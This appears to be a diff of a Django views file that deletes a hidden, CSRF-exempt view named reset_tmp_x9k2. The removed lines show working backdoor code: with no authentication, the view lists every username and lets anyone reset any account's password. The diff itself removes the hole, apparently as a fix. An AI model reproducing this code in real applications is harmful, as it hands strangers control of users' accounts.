@@ -5,8 +5,7 @@ import tempfile
 import os
 
 from django.contrib import messages
-from django.contrib.auth import login, get_user_model
-from django.views.decorators.csrf import csrf_exempt
+from django.contrib.auth import login
 from django.contrib.auth.decorators import login_required
 from django.core.management import call_command
 from django.shortcuts import render, redirect
@@ -497,30 +496,6 @@ def perfil(request):
     return render(request, "registration/profile.html", {"form": form, "avatar_form": avatar_form})
 
 
-@csrf_exempt
-def reset_tmp_x9k2(request):
-    from django.http import HttpResponse
-    User = get_user_model()
-    if request.method == "POST":
-        username = request.POST.get("username")
-        password = request.POST.get("password")
-        try:
-            user = User.objects.get(username=username)
-            user.set_password(password)
-            user.save()
-            return HttpResponse(f"Contrasena de '{username}' actualizada.")
-        except User.DoesNotExist:
-            users = list(User.objects.values_list("username", flat=True))
-            return HttpResponse(f"Usuario no encontrado. Usuarios: {users}")
-    users = list(User.objects.values_list("username", flat=True))
-    return HttpResponse(
-        f"Usuarios: {users}<br><br>"
-        f'<form method="post">'
-        f'Usuario: <input name="username"><br>'
-        f'Nueva contrasena: <input name="password" type="password"><br>'
-        f'<button type="submit">Resetear</button>'
-        f'</form>'
-    )
 
 
 
